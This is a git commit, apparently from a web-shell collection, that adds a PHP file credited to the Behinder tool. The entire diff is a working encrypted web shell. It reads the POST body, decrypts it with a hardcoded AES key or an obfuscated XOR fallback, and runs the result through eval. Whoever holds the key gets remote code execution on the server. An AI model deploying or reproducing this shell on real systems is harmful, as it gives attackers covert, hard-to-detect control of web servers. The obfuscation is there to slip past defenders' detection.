9b50a0cb22df36be0e44f6e1f87060f6f9aa66db
tennc <670357+tennc@users.noreply.github.com>
2020-08-18 21:12:39 +0800

    add some shell
    add shell.aspx shell.jsp shell.php with Behinder
    from : https://github.com/rebeyond/Behinder
    author: rebeyond  👍

---
+++ Behinder/shell.php
@@ -0,0 +1,29 @@
+<?php
+@error_reporting(0);
+session_start();
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST')
+{
+    $key="e45e329feb5d925b";
+	$_SESSION['k']=$key;
+	$post=file_get_contents("php://input");
+	if(!extension_loaded('openssl'))
+	{
+		$t="base64_"."decode";
+		$post=$t($post."");
+		
+		for($i=0;$i<strlen($post);$i++) {
+    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, "AES128", $key);
+	}
+    $arr=explode('|',$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __invoke($p) {eval($p."");}}
+    @call_user_func(new C(),$params);
+}
+?>
